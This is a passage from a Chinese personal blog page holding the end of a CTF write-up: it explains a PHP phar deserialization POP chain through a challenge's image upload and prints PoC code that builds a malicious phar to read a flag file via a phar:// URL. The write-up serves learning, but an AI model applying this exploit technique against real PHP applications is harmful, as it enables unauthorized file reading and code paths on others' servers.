<p>主要控制上传文件的function.php，白名单上传仅限图片<br>看到file_exists($file)，自然就想到phar反序列化<br>下面开始构造pop链<br>test::file_get可以读文件，一直往上回溯到<strong>get<br>show::</strong>toString中$content = $this-&gt;str[‘str’]-&gt;source;可以触发<strong>get<br>C1e4r::</strong>destruct中 echo $this-&gt;test; 触发__toString<br>poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Test </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$file</span>; </span><br><span class="line">    public <span class="variable">$params</span>; </span><br><span class="line">&#125; </span><br><span class="line">class Show </span><br><span class="line">&#123;</span><br><span class="line">public <span class="variable">$source</span>; </span><br><span class="line">public <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line">class C1e4r </span><br><span class="line">&#123; </span><br><span class="line">public <span class="variable">$test</span>;</span><br><span class="line">public <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new Test;</span><br><span class="line"><span class="variable">$a</span>-&gt;params[<span class="string">"source"</span>]=<span class="string">"f1ag.php"</span>;</span><br><span class="line"><span class="variable">$b</span>=new Show;</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">'str'</span>]=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=new C1e4r;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'test.phar'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>访问url/upload/得到上传文件名，再访问file.php?file=phar://upload/文件名，输出base64编码之后的flag</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">cop</p>
              <p class="site-description motion-element" itemprop="description">cop's blog</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cop</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  


  
    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body>
</html>
